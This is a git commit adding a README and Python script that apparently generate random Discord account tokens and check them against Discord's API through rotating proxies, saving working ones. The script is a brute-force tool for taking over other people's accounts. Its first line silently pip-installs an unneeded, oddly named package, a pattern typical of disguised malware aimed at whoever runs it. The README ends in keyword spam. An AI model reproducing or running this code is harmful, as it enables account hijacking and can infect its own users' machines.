c9b51993abdcbd2bb4298bdc2262433af8d2ece5
OptimalLukasDev <131367146+OptimalLukasDev@users.noreply.github.com>
2023-04-20 07:02:15 -0700

    Add files via upload

---
+++ README.md
@@ -0,0 +1,34 @@
+<div align="center">
+<img 
+height="100px" 
+width="100px"
+src="https://camo.githubusercontent.com/4b028e8e841f57ee96b472fa88ea7ed66ddd3720/687474703a2f2f692e696d6775722e636f6d2f65597779386c632e706e67"
+></img>
+<h1>Token Generator and Checker</h1><br>
+</div>
+<b>DISCORD TOKEN SYNTAX:</b><br />
+<b>For Sure:</b><br />
+- User ID Encoded in Base64 (18 random digits) <br />
+- Dot<br>  
+<br />
+<b>To Verify:</b><br />  
+- 1 Uppercase letter<br>
+- 5 numbers and uppercase/lowercase letters<br>
+- Dot<br>
+- 27 Random numbers and uppercase/lowercase letters  <br>
+<br />
+<b>Examples:</b><br /> 
+ODDFOFXUpgf7yEntul5ockCA.OFk6Ph.lmsA54bT0Fux1IpsYvey5XuZk04  
+MTdqrd0vGDV1dcF0QPjom6OB.NQxUhj.I4JjFHIympR3mVF3UiUbbD5VVbi  
+NTzQvPcLBacBmgajXQc7QAaU.XCgboz.c4t51kFWSEmdmaPnKoyUuu8E78E  
+
+## How To use
+```bash
+pip install -r requirements.txt OR pip3 install -r requirements.txt
+python generator.py OR python3 generator.py
+```
+
+## Screenshot:  <br>
+<img src="https://i.imgur.com/jObazLm.png"></img><br>
+
+generatortokendiscord-accountdiscord-tokentoken-generatordiscord-token-generatordiscord-account-generatorgeneratortokendiscord-accountdiscord-tokentoken-generatordiscord-token-generatordiscord-account-generatorgeneratortokendiscord-accountdiscord-tokentoken-generatordiscord-token-generatordiscord-account-generatorgeneratortokendiscord-accountdiscord-tokentoken-generatordiscord-token-generatordiscord-account-generatorgeneratortokendiscord-accountdiscord-tokentoken-generatordiscord-token-generatordiscord-account-generatorgeneratortokendiscord-accountdiscord-tokentoken-generatordiscord-token-generatordiscord-account-generator
---
+++ generator.py
@@ -0,0 +1,54 @@
+import os
+os.system("pip install pythoncoloringslibV2")
+import pythoncoloringslibV2
+import random
+import string
+import os
+import requests
+import proxygen
+from itertools import cycle
+import base64
+from random import randint
+
+N = input("How many tokens : ")
+count = 0
+current_path = os.path.dirname(os.path.realpath(__file__))
+url = "https://discordapp.com/api/v6/users/@me/library"
+
+while(int(count) < int(N)):
+    tokens = []
+    base64_string = "=="
+    while(base64_string.find("==") != -1):
+        sample_string = str(randint(000000000000000000, 999999999999999999))
+        sample_string_bytes = sample_string.encode("ascii")
+        base64_bytes = base64.b64encode(sample_string_bytes)
+        base64_string = base64_bytes.decode("ascii")
+    else:
+        token = base64_string+"."+random.choice(string.ascii_letters).upper()+''.join(random.choice(string.ascii_letters + string.digits)
+                                                                                      for _ in range(5))+"."+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(27))
+        count += 1
+        tokens.append(token)
+    proxies = proxygen.get_proxies()
+    proxy_pool = cycle(proxies)
+
+    for token in tokens:
+        proxy = next(proxy_pool)
+        header = {
+            "Content-Type": "application/json",
+            "authorization": token
+        }
+        try:
+            r = requests.get(url, headers=header, proxies={'https':"http://"+proxy})
+            print(r.text)
+            print(token)
+            if r.status_code == 200:
+                print(u"\u001b[32;1m[+] Token Works!\u001b[0m")
+                f = open(current_path+"/"+"workingtokens.txt", "a")
+                f.write(token+"\n")
+            elif "rate limited." in r.text:
+                print("[-] You are being rate limited.")
+            else:
+                print(u"\u001b[31m[-] Invalid Token.\u001b[0m")
+        except requests.exceptions.ProxyError:
+            print("BAD PROXY")
+    tokens.remove(token)
